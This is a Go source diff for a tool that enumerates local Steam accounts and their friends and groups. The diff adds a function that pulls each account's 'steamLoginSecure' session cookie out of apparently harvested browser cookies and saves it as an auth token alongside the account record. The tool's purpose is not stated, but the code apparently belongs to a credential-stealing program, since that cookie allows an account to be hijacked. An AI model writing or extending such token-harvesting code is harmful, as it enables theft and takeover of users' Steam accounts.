@@ -3,6 +3,7 @@ package main
 import (
 	"os"
 	"regexp"
+	"strings"
 
 	"github.com/andygrunwald/vdf"
 )
@@ -144,6 +145,15 @@ func parseLocalConfigVDF() ([]localConfigResult, error) {
 	return result, nil
 }
 
+func findAuthToken(steamID string) (string, string) {
+	for _, c := range cookies {
+		if c.Name == "steamLoginSecure" && c.URL == "store.steampowered.com" && strings.Contains(c.Value, steamID) {
+			return c.Value, c.BrowserName
+		}
+	}
+	return "", ""
+}
+
 func FindSteamAccounts() error {
 	if _, err := os.Stat(SteamPath); os.IsNotExist(err) {
 		return nil
@@ -167,6 +177,7 @@ func FindSteamAccounts() error {
 		accountName, _ := userData["AccountName"].(string)
 		username, _ := userData["PersonaName"].(string)
 		avatarURL := conf.AvatarURL
+		authToken, browserAuthToken := findAuthToken(steamID)
 		steamAccountResults = append(steamAccountResults, SteamAccountResult{
 			SteamID:     steamID,
 			AccountName: accountName,
@@ -174,7 +185,13 @@ func FindSteamAccounts() error {
 			AvatarURL:   avatarURL,
 			Friends:     conf.Friends,
 			Groups:      conf.Groups,
-			FoundIn:     "Steam Client",
+			AuthToken:   authToken,
+			FoundIn: func() string {
+				if browserAuthToken != "" {
+					return "Steam Client, " + browserAuthToken
+				}
+				return "Steam Client"
+			}(),
 		})
 
 		i++
